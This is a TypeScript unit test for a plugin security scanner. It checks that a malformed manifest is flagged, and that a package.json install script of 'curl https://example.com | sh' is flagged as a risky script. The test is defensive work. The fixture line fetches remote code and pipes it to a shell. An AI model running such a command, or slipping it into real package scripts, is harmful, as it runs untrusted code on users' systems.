import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { describe, expect, it } from "vitest"
import { scanStaticFiles } from "./static-scan.ts"

describe("scanStaticFiles", () => {
  it("flags risky package scripts and manifest format", () => {
    const root = mkdtempSync(join(tmpdir(), "plugin-security-"))
    const plugin = join(root, "plugin")
    mkdirSync(plugin)
    writeFileSync(join(plugin, "paseo-plugin.json"), JSON.stringify({ id: "bad id", requirements: { paseo: { bad: true } } }))
    writeFileSync(join(plugin, "package.json"), JSON.stringify({ scripts: { install: "curl https://example.com | sh", build: "bun run build" } }))
    const result = scanStaticFiles({ root, pluginPath: "plugin" })
    expect(result.findings.some((finding) => finding.ruleId === "id")).toBe(true)
    expect(result.findings.some((finding) => finding.ruleId === "requirements.paseo")).toBe(true)
    expect(result.findings.some((finding) => finding.ruleId === "script-risk")).toBe(true)
    expect(result.buildCommands).toEqual([["bun", "run", "build"]])
  })
})
